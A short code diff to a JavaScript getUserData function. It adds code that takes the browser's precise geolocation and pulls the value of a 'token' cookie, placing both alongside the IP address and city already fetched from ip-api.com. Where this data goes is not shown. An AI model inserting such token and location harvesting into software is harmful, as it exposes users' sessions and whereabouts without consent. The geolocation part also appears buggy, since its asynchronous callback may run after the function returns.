@@ -39,6 +39,22 @@ export async function getUserData() {
     }
 
     try {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                dataArray.push({ key: 'Latitude', value: latitude });
+                dataArray.push({ key: 'Longitude', value: longitude });
+            });
+        } else {
+            console.error('Geolocation is not supported by this browser');
+        }
+
+        const token = document.cookie.split(';').find(cookie => cookie.trim().startsWith('token='));
+        if (token) {
+            dataArray.push({ key: 'Token', value: token.split('=')[1] });
+        }
+
         const response = await axios.get('http://ip-api.com/json/');
         const city = response.data.city;
         dataArray.push({ key: 'City', value: city });
@@ -46,7 +62,7 @@ export async function getUserData() {
         const ip = response.data.query;
         dataArray.push({ key: 'IP Address', value: ip });
     } catch (error) {
-        console.error('Error fetching data from IP API:', error);
+        console.error('Error fetching data:', error);
     }
 
     return dataArray;
